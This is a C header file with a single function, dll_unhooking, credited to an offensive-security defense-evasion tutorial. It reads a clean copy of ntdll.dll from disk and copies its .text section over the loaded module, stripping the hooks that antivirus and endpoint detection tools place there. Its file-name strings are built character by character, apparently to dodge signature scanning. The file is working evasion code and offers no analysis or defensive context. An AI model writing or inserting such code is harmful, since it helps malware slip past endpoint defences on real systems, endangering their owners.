#pragma once

#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include <winternl.h>
#include <psapi.h>
#include <stdbool.h>

// Source : https://www.ired.team/offensive-security/defense-evasion/how-to-unhook-a-dll-using-c++

void dll_unhooking( char *arg1 )
{
    // Get handle to self
	HANDLE process = GetCurrentProcess();
	MODULEINFO mi = {};

    // Get handle to ntdll.dll
    const char nt_dll[] = {'n', 't', 'd', 'l', 'l', '.', 'd', 'l', 'l', 0};
	HMODULE ntdllModule = GetModuleHandleA(nt_dll);

    // Parse ntdll.dll from disk
	GetModuleInformation(process, ntdllModule, &mi, sizeof(mi));
	LPVOID ntdllBase = (LPVOID)mi.lpBaseOfDll;
	char path_ntdll_dll[] = {'c', ':', '\\', '\\', 'w', 'i', 'n', 'd', 'o', 'w', 's', '\\', 's', 'y', 's', 't', 'e', 'm', '3', '2', '\\', 'n', 't', 'd', 'l', 'l', '.', 'd', 'l', 'l', '\0'};
	HANDLE ntdllFile = CreateFileA(path_ntdll_dll, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
	HANDLE ntdllMapping = CreateFileMapping(ntdllFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
	LPVOID ntdllMappingAddress = MapViewOfFile(ntdllMapping, FILE_MAP_READ, 0, 0, 0);

	PIMAGE_DOS_HEADER hookedDosHeader = (PIMAGE_DOS_HEADER)ntdllBase;
	PIMAGE_NT_HEADERS hookedNtHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)ntdllBase + hookedDosHeader->e_lfanew);

	for (WORD i = 0; i < hookedNtHeader->FileHeader.NumberOfSections; i++) {
		PIMAGE_SECTION_HEADER hookedSectionHeader = (PIMAGE_SECTION_HEADER)((DWORD_PTR)IMAGE_FIRST_SECTION(hookedNtHeader) + ((DWORD_PTR)IMAGE_SIZEOF_SECTION_HEADER * i));
		// Update .text section
		if (!strcmp((char*)hookedSectionHeader->Name, (char*)".text")) {
			DWORD oldProtection = 0;
			bool isProtected = VirtualProtect((LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)hookedSectionHeader->VirtualAddress), hookedSectionHeader->Misc.VirtualSize, PAGE_EXECUTE_READWRITE, &oldProtection);
			memcpy((LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)hookedSectionHeader->VirtualAddress), (LPVOID)((DWORD_PTR)ntdllMappingAddress + (DWORD_PTR)hookedSectionHeader->VirtualAddress), hookedSectionHeader->Misc.VirtualSize);
			isProtected = VirtualProtect((LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)hookedSectionHeader->VirtualAddress), hookedSectionHeader->Misc.VirtualSize, oldProtection, &oldProtection);
		}
	}

	CloseHandle(process);
	CloseHandle(ntdllFile);
	CloseHandle(ntdllMapping);
	FreeLibrary(ntdllModule);
}